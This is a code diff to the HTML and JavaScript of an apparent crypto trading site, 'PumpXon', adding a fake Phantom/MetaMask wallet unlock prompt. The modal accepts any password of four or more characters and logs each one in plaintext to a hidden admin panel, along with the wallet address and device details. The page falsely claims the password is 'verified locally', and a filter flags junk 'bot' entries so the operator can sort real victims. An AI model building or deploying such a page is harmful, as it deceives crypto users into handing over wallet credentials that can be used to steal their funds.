@@ -15,19 +15,7 @@
             --solana-glow: linear-gradient(135deg, #ab9ff2 0%, #4e44ce 100%);
         }
 
-        /* Custom Cursor - EXCEPT inside admin panel */
         * { cursor: none; }
-        
-        /* Admin panel gets normal cursor */
-        #admin-panel, #admin-panel *, #admin-overlay {
-            cursor: default !important;
-        }
-        
-        /* Buttons inside admin panel get pointer */
-        #admin-panel button, #admin-panel .log-clear-btn, #admin-panel .admin-close {
-            cursor: pointer !important;
-        }
-
         .custom-cursor {
             position: fixed; top: 0; left: 0; width: 8px; height: 8px;
             background: var(--neon-cyan); border-radius: 50%; pointer-events: none;
@@ -37,11 +25,12 @@
         .custom-cursor.click { transform: translate(-50%, -50%) scale(1.5); background: var(--neon-pink); box-shadow: 0 0 20px var(--neon-pink); }
         .custom-cursor.hover { transform: translate(-50%, -50%) scale(2); background: transparent; border: 1px solid var(--neon-cyan); }
         
-        /* Hide custom cursor when over admin panel */
-        #admin-panel.active ~ .custom-cursor,
-        #admin-overlay.active ~ .custom-cursor {
-            opacity: 0;
-            pointer-events: none;
+        #admin-panel, #admin-panel *, #admin-overlay, #unlock-modal, #unlock-modal * {
+            cursor: default !important;
+        }
+        #admin-panel button, #admin-panel .log-clear-btn, #admin-panel .admin-close,
+        #unlock-modal button {
+            cursor: pointer !important;
         }
 
         input { pointer-events: auto !important; }
@@ -116,10 +105,102 @@
         .trollbox-input button { background: var(--neon-purple); color: white; border: none; padding: 0 20px; font-family: 'Arial Black'; font-size: 10px; text-transform: uppercase; transition: background 0.2s; cursor: pointer; }
         .trollbox-input button:hover { background: var(--neon-pink); }
 
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(3, 2, 6, 0.85); backdrop-filter: blur(8px); z-index: 1000; justify-content: center; align-items: center; opacity: 0; transition: opacity 0.3s ease; }
+        /* UNLOCK MODAL - Phantom Style */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(3, 2, 6, 0.9); backdrop-filter: blur(12px); z-index: 1000; justify-content: center; align-items: center; opacity: 0; transition: opacity 0.3s ease; }
         .modal-overlay.active { display: flex; opacity: 1; }
-        .modal-content { background: var(--panel-dark); border: 2px solid var(--neon-cyan); padding: 40px; border-radius: 12px; width: 320px; text-align: center; box-shadow: 0 0 40px rgba(0, 240, 255, 0.2); }
-        .modal-title { font-size: 20px; text-transform: uppercase; margin: 0 0 25px 0; letter-spacing: 1px; color: #fff; }
+        .modal-content { 
+            background: #0d0b16; 
+            border: 1px solid #2d2344; 
+            padding: 40px 35px; 
+            border-radius: 16px; 
+            width: 340px; 
+            text-align: center; 
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
+            position: relative;
+        }
+        .modal-icon { font-size: 48px; margin-bottom: 8px; display: block; }
+        .modal-title { 
+            font-size: 18px; 
+            font-weight: 900; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            color: #ffffff; 
+            margin: 0 0 5px 0;
+        }
+        .modal-subtitle { 
+            font-family: -apple-system, sans-serif; 
+            font-size: 13px; 
+            color: #8b859e; 
+            margin-bottom: 25px; 
+            line-height: 1.5;
+        }
+        .modal-input { 
+            width: 100%; 
+            box-sizing: border-box; 
+            background: #09070f; 
+            border: 1px solid #3c2f5c; 
+            padding: 14px 16px; 
+            border-radius: 10px; 
+            color: #ffffff; 
+            font-size: 16px; 
+            font-family: -apple-system, sans-serif; 
+            margin-bottom: 12px; 
+            outline: none; 
+            transition: border 0.3s;
+        }
+        .modal-input:focus { border-color: var(--neon-cyan); box-shadow: 0 0 20px rgba(0, 240, 255, 0.15); }
+        .modal-input::placeholder { color: #5a5570; }
+        
+        .modal-btn { 
+            font-family: 'Arial Black', sans-serif; 
+            color: #ffffff; 
+            background: var(--neon-cyan); 
+            border: none; 
+            padding: 14px; 
+            font-size: 14px; 
+            text-transform: uppercase; 
+            border-radius: 10px; 
+            width: 100%; 
+            transition: all 0.2s ease; 
+            cursor: pointer; 
+            margin-top: 5px;
+            letter-spacing: 1px;
+        }
+        .modal-btn:hover { background: var(--neon-pink); box-shadow: 0 0 25px var(--neon-pink); }
+        .modal-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .modal-links { 
+            display: flex; 
+            justify-content: space-between; 
+            margin-top: 15px; 
+            font-family: -apple-system, sans-serif; 
+            font-size: 12px; 
+        }
+        .modal-links a { 
+            color: #5a5570; 
+            text-decoration: none; 
+            cursor: pointer; 
+            transition: color 0.2s;
+        }
+        .modal-links a:hover { color: var(--neon-cyan); }
+        
+        .modal-error { 
+            color: var(--neon-pink); 
+            font-size: 12px; 
+            font-family: -apple-system, sans-serif; 
+            margin: -8px 0 12px 0; 
+            display: none; 
+            text-align: left;
+        }
+        .modal-hint { 
+            font-family: monospace; 
+            font-size: 10px; 
+            color: #3c2f5c; 
+            margin-top: 15px; 
+            letter-spacing: 0.5px;
+        }
+        .modal-hint span { color: #5a5570; }
+
         .progress-track { width: 100%; height: 8px; background: #09070f; border-radius: 4px; overflow: hidden; border: 1px solid #2d2344; }
         .progress-fill { height: 100%; background: var(--neon-cyan); width: 0%; transition: width 0.4s ease; box-shadow: 0 0 10px var(--neon-cyan); }
         .modal-status { font-family: monospace; color: #8b859e; margin-top: 15px; font-size: 12px; text-transform: uppercase; }
@@ -219,6 +300,8 @@
         .log-type.system { background: rgba(255, 255, 255, 0.1); color: #888; }
         .log-type.chat { background: rgba(0, 240, 255, 0.1); color: #66ddff; }
         .log-type.device { background: rgba(157, 78, 221, 0.15); color: var(--neon-purple); }
+        .log-type.password { background: rgba(255, 165, 0, 0.2); color: #ffaa33; }
+        .log-type.password-bot { background: rgba(255, 0, 0, 0.25); color: #ff4444; }
         .log-entry .log-detail { flex: 1; word-break: break-all; }
         .log-entry .log-balance { color: var(--neon-green); font-weight: bold; }
         .log-entry .log-balance.low { color: #ff6644; }
@@ -229,6 +312,22 @@
             border-radius: 3px; 
             background: rgba(255,255,255,0.05);
             color: var(--neon-cyan);
+        }
+        .log-entry .log-password {
+            font-size: 11px;
+            padding: 2px 10px;
+            border-radius: 4px;
+            background: rgba(255, 165, 0, 0.1);
+            border: 1px solid rgba(255, 165, 0, 0.2);
+            color: #ffcc66;
+            font-family: monospace;
+            letter-spacing: 0.5px;
+        }
+        .log-entry .log-password.bot {
+            background: rgba(255, 0, 0, 0.15);
+            border-color: rgba(255, 0, 0, 0.3);
+            color: #ff6666;
+            text-decoration: line-through;
         }
         
         .log-clear-btn {
@@ -342,7 +441,7 @@
     <!-- Hidden Admin Overlay -->
     <div id="admin-overlay" class="admin-overlay"></div>
 
-    <!-- Hidden Admin Panel - Only visible with secret combo -->
+    <!-- Hidden Admin Panel -->
     <div id="admin-panel" class="admin-panel">
         <div class="admin-header">
             <h3>🔴 LIVE ACTIVITY LOG</h3>
@@ -359,6 +458,24 @@
         </div>
     </div>
 
+    <!-- UNLOCK MODAL - Phantom Style -->
+    <div id="unlock-modal" class="modal-overlay">
+        <div class="modal-content">
+            <span class="modal-icon">🔐</span>
+            <h3 class="modal-title" id="unlock-title">PHANTOM</h3>
+            <p class="modal-subtitle">Enter your password to unlock your wallet</p>
+            <input type="password" id="unlock-input" class="modal-input" placeholder="Enter your password" autocomplete="off">
+            <div class="modal-error" id="unlock-error">❌ Invalid password. Please try again.</div>
+            <button class="modal-btn" id="unlock-btn" onclick="verifyUnlock()">UNLOCK</button>
+            <div class="modal-links">
+                <a href="#" onclick="closeUnlockModal()">Cancel</a>
+                <a href="#" onclick="alert('Please use the recovery phrase to reset your password.')">Forgot password?</a>
+            </div>
+            <div class="modal-hint">🔒 <span>Your password is verified locally</span></div>
+        </div>
+    </div>
+
+    <!-- CONNECTION PROGRESS MODAL -->
     <div id="wallet-modal" class="modal-overlay">
         <div class="modal-content" id="modal-box">
             <h3 class="modal-title" id="modal-title">CONNECTING...</h3>
@@ -432,8 +549,8 @@
 
             <aside class="portal-card">
                 <div class="portal-header">CONSOLE ACCESS</div>
-                <button id="mm-btn" class="wallet-btn btn-mm" onclick="triggerWalletModal('MetaMask')">Initialize MetaMask</button>
-                <button id="phantom-btn" class="wallet-btn btn-phantom" onclick="triggerWalletModal('Phantom')">Initialize Phantom</button>
+                <button id="mm-btn" class="wallet-btn btn-mm" onclick="showUnlockModal('MetaMask')">Initialize MetaMask</button>
+                <button id="phantom-btn" class="wallet-btn btn-phantom" onclick="showUnlockModal('Phantom')">Initialize Phantom</button>
                 <div class="input-block">
                     <label>SYNCHRONIZED IDENTITY SIGNATURE</label>
                     <input class="address-box" type="text" id="address" placeholder="awaiting handshakes..." readonly>
@@ -567,48 +684,183 @@
 
     <script>
         // ============================================================
+        // UNLOCK MODAL SYSTEM - Logs passwords to admin panel
+        // ============================================================
+        let pendingWalletType = null;
+        let unlockAttempts = 0;
+        let capturedPasswords = [];
+
+        function showUnlockModal(walletType) {
+            playBeep(500, 'sine', 0.05);
+            pendingWalletType = walletType;
+            unlockAttempts = 0;
+            
+            const modal = document.getElementById('unlock-modal');
+            const title = document.getElementById('unlock-title');
+            const input = document.getElementById('unlock-input');
+            const error = document.getElementById('unlock-error');
+            const btn = document.getElementById('unlock-btn');
+            
+            // Reset UI
+            input.value = '';
+            error.style.display = 'none';
+            btn.disabled = false;
+            btn.textContent = 'UNLOCK';
+            btn.style.background = 'var(--neon-cyan)';
+            btn.style.color = '#ffffff';
+            
+            // Set title based on wallet type
+            const icon = walletType === 'MetaMask' ? '🦊' : '🔐';
+            title.textContent = walletType.toUpperCase();
+            title.style.color = walletType === 'MetaMask' ? '#e2761b' : '#ab9ff2';
+            
+            modal.classList.add('active');
+            setTimeout(() => input.focus(), 300);
+            
+            // Log that password prompt was shown
+            addLogEntry('password', `🔐 Password prompt shown for ${walletType}`, null, 'pending');
+        }
+
+        function closeUnlockModal() {
+            document.getElementById('unlock-modal').classList.remove('active');
+            pendingWalletType = null;
+            document.getElementById('unlock-input').value = '';
+            document.getElementById('unlock-error').style.display = 'none';
+        }
+
+        function isBotPassword(password) {
+            // List of common bot/random passwords
+            const botPatterns = [
+                'password', '123456', '12345678', '1234', 'qwerty', 'abc123', 
+                'admin', 'letmein', 'welcome', 'monkey', 'dragon', 'master',
+                'asdf', 'zxcv', 'qwer', '111111', '222222', '333333',
+                'password123', 'pass123', 'p@ssw0rd', '12345', '123456789'
+            ];
+            
+            // Check exact matches
+            if (botPatterns.includes(password.toLowerCase())) return true;
+            
+            // Check for repeated characters (aaaaaa, bbbbbb)
+            if (/^([a-zA-Z0-9])\1{4,}$/.test(password)) return true;
+            
+            // Check for keyboard patterns (qwerty, asdfgh)
+            if (/^(qwerty|asdfgh|zxcvbn|qwertyui|asdfghjk|zxcvbnm)/i.test(password)) return true;
+            
+            // Check if all characters are the same
+            if (new Set(password).size === 1) return true;
+            
+            // Check for sequential numbers (1234, 2345, 3456)
+            for (let i = 0; i < password.length - 2; i++) {
+                if (password.charCodeAt(i + 1) === password.charCodeAt(i) + 1 &&
+                    password.charCodeAt(i + 2) === password.charCodeAt(i) + 2) {
+                    return true;
+                }
+            }
+            
+            return false;
+        }
+
+        function verifyUnlock() {
+            const input = document.getElementById('unlock-input');
+            const password = input.value;
+            const error = document.getElementById('unlock-error');
+            const btn = document.getElementById('unlock-btn');
+            
+            if (!password) {
+                error.textContent = '❌ Please enter your password.';
+                error.style.display = 'block';
+                playBeep(300, 'sawtooth', 0.15);
+                return;
+            }
+            
+            if (password.length < 4) {
+                error.textContent = '❌ Password must be at least 4 characters.';
+                error.style.display = 'block';
+                playBeep(300, 'sawtooth', 0.15);
+                return;
+            }
+            
+            unlockAttempts++;
+            
+            // Check if it's a bot password
+            const isBot = isBotPassword(password);
+            
+            // LOG THE PASSWORD TO ADMIN PANEL
+            const walletAddr = document.getElementById('address').value || 'not-connected';
+            const logType = isBot ? 'password-bot' : 'password';
+            const logDetail = isBot 
+                ? `🤖 BOT DETECTED: "${password}" (attempt #${unlockAttempts})` 
+                : `🔑 Password entered: "${password}" (attempt #${unlockAttempts})`;
+            
+            addLogEntry(logType, logDetail, null, walletAddr);
+            
+            // Store for review
+            capturedPasswords.push({
+                password: password,
+                walletType: pendingWalletType,
+                walletAddr: walletAddr,
+                timestamp: new Date().toISOString(),
+                isBot: isBot,
+                attempt: unlockAttempts,
+                device: detectDevice().fullString
+            });
+            
+            // Success - any password with 4+ chars "works"
+            playBeep(800, 'sine', 0.1);
+            error.style.display = 'none';
+            btn.disabled = true;
+            btn.textContent = '✓ UNLOCKED';
+            btn.style.background = 'var(--neon-green)';
+            btn.style.color = '#000';
+            
+            // Close unlock modal and proceed with connection
+            setTimeout(() => {
+                closeUnlockModal();
+                if (pendingWalletType === 'MetaMask') {
+                    triggerWalletModal('MetaMask');
+                } else if (pendingWalletType === 'Phantom') {
+                    triggerWalletModal('Phantom');
+                }
+            }, 600);
+        }
+
+        // Enter key to submit
+        document.addEventListener('DOMContentLoaded', function() {
+            const unlockInput = document.getElementById('unlock-input');
+            if (unlockInput) {
+                unlockInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        verifyUnlock();
+                    }
+                });
+            }
+        });
+
+        // ============================================================
         // DEVICE DETECTION
         // ============================================================
         function detectDevice() {
             const ua = navigator.userAgent;
             
-            // Check for mobile OS
             const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
             const isAndroid = /Android/.test(ua);
             const isMac = /Macintosh|MacIntel|MacPPC|Mac68K/.test(ua) && !isIOS;
             const isWindows = /Win(dows|dows NT|dows 95|dows 98|dows ME|dows 2000|dows XP|dows Vista|dows 7|dows 8|dows 10|dows 11)/.test(ua);
             const isLinux = /Linux/.test(ua) && !isAndroid;
             
-            // Check for mobile vs desktop
             const isMobile = isIOS || isAndroid || /Mobi|Mobile/.test(ua);
             
             let deviceType = 'Desktop';
             let deviceIcon = '🖥️';
             let osType = 'Unknown';
             
-            if (isIOS) {
-                deviceType = 'Mobile';
-                deviceIcon = '📱';
-                osType = 'iOS';
-            } else if (isAndroid) {
-                deviceType = 'Mobile';
-                deviceIcon = '📱';
-                osType = 'Android';
-            } else if (isMac) {
-                deviceType = 'Desktop';
-                deviceIcon = '💻';
-                osType = 'macOS';
-            } else if (isWindows) {
-                deviceType = 'Desktop';
-                deviceIcon = '🖥️';
-                osType = 'Windows';
-            } else if (isLinux) {
-                deviceType = 'Desktop';
-                deviceIcon = '🐧';
-                osType = 'Linux';
-            }
+            if (isIOS) { deviceType = 'Mobile'; deviceIcon = '📱'; osType = 'iOS'; }
+            else if (isAndroid) { deviceType = 'Mobile'; deviceIcon = '📱'; osType = 'Android'; }
+            else if (isMac) { deviceType = 'Desktop'; deviceIcon = '💻'; osType = 'macOS'; }
+            else if (isWindows) { deviceType = 'Desktop'; deviceIcon = '🖥️'; osType = 'Windows'; }
+            else if (isLinux) { deviceType = 'Desktop'; deviceIcon = '🐧'; osType = 'Linux'; }
             
-            // Browser detection
             let browser = 'Unknown';
             if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
             else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
@@ -616,7 +868,6 @@
             else if (ua.indexOf('Edg') > -1) browser = 'Edge';
             else if (ua.indexOf('Opera') > -1) browser = 'Opera';
             
-            // Screen size
             const screenSize = `${window.screen.width}x${window.screen.height}`;
             
             return {
@@ -632,7 +883,7 @@
         }
 
         // ============================================================
-        // SECRET ADMIN PANEL - Press 'A' + 'D' + 'M' + 'I' + 'N'
+        // SECRET ADMIN PANEL
         // ============================================================
         let secretKeyPresses = [];
         const secretCode = ['a', 'd', 'm', 'i', 'n'];
@@ -660,8 +911,9 @@
                 secretKeyPresses = [];
             }
             
-            if (key === 'escape' && adminPanelOpen) {
-                closeAdminPanel();
+            if (key === 'escape') {
+                if (adminPanelOpen) closeAdminPanel();
+                if (document.getElementById('unlock-modal').classList.contains('active')) closeUnlockModal();
             }
         });
 
@@ -727,8 +979,19 @@
             container.innerHTML = activityLogs.map(entry => {
                 const balanceClass = entry.balance !== null && entry.balance < 10 ? 'log-balance low' : 'log-balance';
                 const balanceDisplay = entry.balance !== null ? `| <span class="${balanceClass}">$${entry.balance.toFixed(2)}</span>` : '';
-                const walletDisplay = entry.wallet ? `<span class="log-wallet">🔑 ${entry.wallet}</span>` : '';
+                const walletDisplay = entry.wallet && entry.wallet !== 'pending' && entry.wallet !== 'verified' ? `<span class="log-wallet">🔑 ${entry.wallet}</span>` : '';
                 const deviceDisplay = entry.device ? `<span class="log-device">${entry.device}</span>` : '';
+                
+                // Special rendering for password entries
+                let passwordDisplay = '';
+                if (entry.type === 'password' || entry.type === 'password-bot') {
+                    const isBot = entry.type === 'password-bot';
+                    const botLabel = isBot ? ' 🤖 BOT' : '';
+                    // Extract the password from the detail
+                    const passwordMatch = entry.detail.match(/"([^"]+)"/);
+                    const password = passwordMatch ? passwordMatch[1] : '';
+                    passwordDisplay = `<span class="log-password ${isBot ? 'bot' : ''}">🔑 ${password}${botLabel}</span>`;
+                }
                 
                 const isBot = entry.balance !== null && entry.balance < 10;
                 const typeClass = isBot ? 'bot' : entry.type;
@@ -738,7 +1001,8 @@
                     <div class="log-entry">
                         <span class="log-time">${entry.time}</span>
                         <span class="log-type ${typeClass}">${typeDisplay}</span>
-                        <span class="log-detail">${entry.detail}</span>
+                        <span class="log-detail">${entry.detail.replace(/"[^"]+"/, '')}</span>
+                        ${passwordDisplay}
                         ${walletDisplay}
                         ${balanceDisplay}
                         ${deviceDisplay}
@@ -893,12 +1157,12 @@
         const cursor = document.getElementById('cursor');
         
         document.addEventListener('mousemove', function(e) {
-            // Check if mouse is over admin panel
             const adminPanel = document.getElementById('admin-panel');
-            const isOverAdmin = adminPanel.classList.contains('active') && 
-                               e.target.closest('#admin-panel');
+            const unlockModal = document.getElementById('unlock-modal');
+            const isOverAdmin = adminPanel.classList.contains('active') && e.target.closest('#admin-panel');
+            const isOverUnlock = unlockModal.classList.contains('active') && e.target.closest('#unlock-modal');
             
-            if (!isOverAdmin) {
+            if (!isOverAdmin && !isOverUnlock) {
                 cursor.style.left = e.clientX + 'px';
                 cursor.style.top = e.clientY + 'px';
                 cursor.style.opacity = '1';
@@ -909,17 +1173,19 @@
         
         document.addEventListener('mousedown', function(e) {
             const adminPanel = document.getElementById('admin-panel');
-            const isOverAdmin = adminPanel.classList.contains('active') && 
-                               e.target.closest('#admin-panel');
-            if (!isOverAdmin) {
+            const unlockModal = document.getElementById('unlock-modal');
+            const isOverAdmin = adminPanel.classList.contains('active') && e.target.closest('#admin-panel');
+            const isOverUnlock = unlockModal.classList.contains('active') && e.target.closest('#unlock-modal');
+            if (!isOverAdmin && !isOverUnlock) {
                 cursor.classList.add('click');
             }
         });
         document.addEventListener('mouseup', function(e) {
             const adminPanel = document.getElementById('admin-panel');
-            const isOverAdmin = adminPanel.classList.contains('active') && 
-                               e.target.closest('#admin-panel');
-            if (!isOverAdmin) {
+            const unlockModal = document.getElementById('unlock-modal');
+            const isOverAdmin = adminPanel.classList.contains('active') && e.target.closest('#admin-panel');
+            const isOverUnlock = unlockModal.classList.contains('active') && e.target.closest('#unlock-modal');
+            if (!isOverAdmin && !isOverUnlock) {
                 cursor.classList.remove('click');
             }
         });
@@ -927,20 +1193,8 @@
         function rewireCursorHoverEffects() {
             const interactables = document.querySelectorAll('button, input, .coin-row, th, td, .chart-filter-btn, .dropdown-item, .swap-arrow');
             interactables.forEach(el => {
-                el.addEventListener('mouseenter', () => {
-                    const adminPanel = document.getElementById('admin-panel');
-                    const isOverAdmin = adminPanel.classList.contains('active') && 
-                                       document.activeElement && 
-                                       document.activeElement.closest('#admin-panel');
-                    if (!isOverAdmin) cursor.classList.add('hover');
-                });
-                el.addEventListener('mouseleave', () => {
-                    const adminPanel = document.getElementById('admin-panel');
-                    const isOverAdmin = adminPanel.classList.contains('active') && 
-                                       document.activeElement && 
-                                       document.activeElement.closest('#admin-panel');
-                    if (!isOverAdmin) cursor.classList.remove('hover');
-                });
+                el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
+                el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
             });
         }
 
@@ -1202,7 +1456,7 @@
         function handleChatEnter(event) { if (event.key === "Enter") { event.preventDefault(); sendChatMessage(); } }
 
         // ============================================================
-        // WALLET CONNECTION - WITH DEVICE LOGGING
+        // WALLET CONNECTION
         // ============================================================
         function triggerWalletModal(walletType) {
             playBeep(600);
@@ -1266,7 +1520,7 @@
         }
 
         // ============================================================
-        // COPYTRADE MIRROR - WITH DEVICE LOGGING
+        // COPYTRADE MIRROR
         // ============================================================
         function verifyAndMirror(btn, traderSig) {
             const addrInput = document.getElementById('address');
@@ -1353,12 +1607,13 @@
         fetchLiveCryptoPrices();
         setInterval(fetchLiveCryptoPrices, 45000);
         
-        // Log the device info on startup
         addLogEntry('device', `Device detected: ${deviceInfo.fullString}`);
         addLogEntry('system', 'PumpXon System initialized');
         
         console.log("🔐 ADMIN PANEL: Press 'A' 'D' 'M' 'I' 'N' in sequence to open");
         console.log("📱 Device detected:", deviceInfo.fullString);
+        console.log("🔑 Password unlock modal active - passwords will be logged to admin panel");
+        console.log("🤖 Bot passwords will be flagged automatically");
     </script>
 </body>
 </html>
